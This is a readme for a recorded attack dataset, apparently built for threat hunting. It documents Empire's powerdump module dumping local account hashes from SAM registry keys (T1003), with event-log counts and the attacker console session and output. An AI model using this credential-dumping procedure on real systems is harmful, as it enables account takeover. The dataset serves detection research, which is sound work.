# Empire Powerdump

Dumping hashes from HKLM:\SAM\SAM\Domains\ registry keys.

## Technique(s) ID

T1003

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_powerdump.tar.gz](./empire_powerdump.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18225051

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             382 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               8 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             109 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |              66 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              20 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               9 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kernel Object                                          |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               1 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             206 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             182 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |              98 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |              66 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              38 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              17 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               9 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               7 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               4 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             323 |

## Attacker Activity

```
(Empire: TKV35P8X) > usemodule credentials/powerdump*
(Empire: powershell/credentials/powerdump) > info

              Name: Invoke-PowerDump
            Module: powershell/credentials/powerdump
        NeedsAdmin: True
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  DarkOperator
  winfang
  Kathy Peters
  ReL1K

Description:
  Dumps hashes from the local system using Posh-SecMod's
  Invoke-PowerDump

Comments:
  https://github.com/darkoperator/Posh-
  SecMod/blob/master/PostExploitation/PostExploitation.psm1

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        TKV35P8X                  Agent to run module on.                 

(Empire: powershell/credentials/powerdump) > execute
[*] Tasked TKV35P8X to run TASK_CMD_JOB
[*] Agent TKV35P8X tasked with task ID 34
[*] Tasked agent TKV35P8X to run module powershell/credentials/powerdump
(Empire: powershell/credentials/powerdump) > Job started: 36KA8E
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


Nora:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::




(Empire: powershell/credentials/powerdump) >
```